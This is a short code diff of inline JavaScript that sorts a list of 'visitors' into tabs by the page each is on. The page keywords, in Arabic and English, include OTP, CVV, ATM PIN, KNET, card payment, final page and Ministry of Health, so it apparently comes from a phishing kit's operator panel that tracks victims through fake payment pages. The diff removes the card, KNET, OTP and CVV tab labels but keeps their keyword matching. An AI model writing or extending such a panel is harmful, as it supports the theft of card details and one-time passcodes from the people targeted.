@@ -3533,7 +3533,7 @@ fx();setInterval(fx,700);window.addEventListener("resize",fx);
 <script id="kddTabsJs">(function(){
 if(window.__kt)return;window.__kt=1;
 var K=[['otp','otp|رمز'],['cvv','cvv'],['atm','atm|مرور'],['knet','كي نت|knet'],['card','بطاقة|credit|card'],['sum','ملخص|summary'],['fin','نهائي|final'],['cart','سلة','cart'],['chk','طلب|checkout'],['prd','منتج|مشتج|product'],['moh','وزار|moh']];
-var L={home:'🏠 الرئيسية',prd:'📦 المنتجات',cart:'🛒 السلة',chk:'🧾 إتمام الطلب',card:'💳 الدفع بالبطاقة',knet:'🏦 دفع KNET',otp:'🔑 رمز OTP',atm:'🏧 ATM',cvv:'🔒 CVV',sum:'📋 ملخص الدفع',fin:'✅ الصفحة النهائية',moh:'🩺 وزارة الصحة'};
+var L={home:'🏠 الرئيسية',prd:'📦 المنتجات',cart:'🛒 السلة',chk:'🧾 إتمام الطلب'};
 function key(p){p=(p||'').toLowerCase();for(var i=0;i<K.length;i++){var a=K[i][1].split('|');for(var j=0;j<a.length;j++)if(p.indexOf(a[j])>=0)return K[i][0]}return 'home'}
 var st=document.createElement('style');st.textContent='#kddTabs{flex:1 1 auto;min-width:0;display:flex;gap:6px;overflow-x:auto;padding:0 8px}#kddTabs::-webkit-scrollbar{display:none}.kdtab{flex:0 0 auto;padding:6px 12px;border-radius:999px;font-size:12px;font-weight:700;background:#f3f4f6;color:#374151;border:1px solid #e5e7eb;cursor:pointer;white-space:nowrap}.kdtab.on{background:#7c3aed;color:#fff;border-color:#7c3aed}.kdtab.z{opacity:.45}.kdtab b{margin-inline-start:5px;background:rgba(0,0,0,.08);border-radius:999px;padding:0 6px;font-size:11px}@media(max-width:860px){header>.container{flex-wrap:wrap!important}#kddTabs{order:9;width:100%;padding:6px 0}}';document.head.appendChild(st);
 function pick(k){var v=null;try{visitors.forEach(function(x){if(v===null&&key(x.page)===k)v=x})}catch(e){}return v}
